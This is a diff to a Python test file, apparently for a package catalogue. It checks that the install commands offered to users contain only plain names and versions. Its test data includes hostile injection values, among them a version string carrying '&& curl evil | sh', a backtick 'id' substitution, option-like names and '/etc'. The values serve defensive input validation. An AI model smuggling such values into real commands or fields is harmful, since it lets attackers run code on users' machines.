@@ -115,8 +115,27 @@ def test_a_file_has_its_address_and_nothing_to_copy():
         ("pypi", ComponentKey("", "greeter", "1.0 && curl evil | sh")),
         ("pypi", ComponentKey("", "greeter", "1!2.0")),
         ("docker", ComponentKey("", "team/app", "1.0`id`")),
+        ("npm", ComponentKey("", "--force", "1.0.0")),
+        ("npm", ComponentKey("", "tool", "")),
+        ("pypi", ComponentKey("", "-r", "1.0")),
+        ("docker", ComponentKey("", "team/app", "")),
+        ("maven", ComponentKey("", "app", "1.0")),
     ],
-    ids=["quote", "newline", "space", "semicolon", "substitution", "and", "history", "backtick"],
+    ids=[
+        "quote",
+        "newline",
+        "space",
+        "semicolon",
+        "substitution",
+        "and",
+        "history",
+        "backtick",
+        "option",
+        "no-version",
+        "pip-option",
+        "no-tag",
+        "no-group",
+    ],
 )
 def test_nothing_is_offered_to_paste_that_would_be_more_than_a_name(format, key):
     """What a remote or a deploy named is put where a person will run it."""
@@ -124,9 +143,12 @@ def test_nothing_is_offered_to_paste_that_would_be_more_than_a_name(format, key)
 
 
 def test_plain_text_is_what_is_safe_between_other_words():
-    assert formats.plain("com.acme", "app_1", "1.0+build-7", "team/app", "~x", "")
+    assert formats.plain("com.acme", "app_1", "1.0+build-7", "team/app", "x~1", "_x")
     for hostile in (" ", "a b", "a;b", "$x", "`x`", "a'b", 'a"b', "a\nb", "a&b", "<a>", "é", "a!b"):
         assert not formats.plain("fine", hostile)
+    # Nothing a client would read as an option, or a shell as a home directory or a path.
+    for odd in ("", "-g", "--force", "~root", ".hidden", "/etc"):
+        assert not formats.plain("fine", odd)
 
 
 async def test_a_components_detail_says_how_to_use_it(client, root, db):
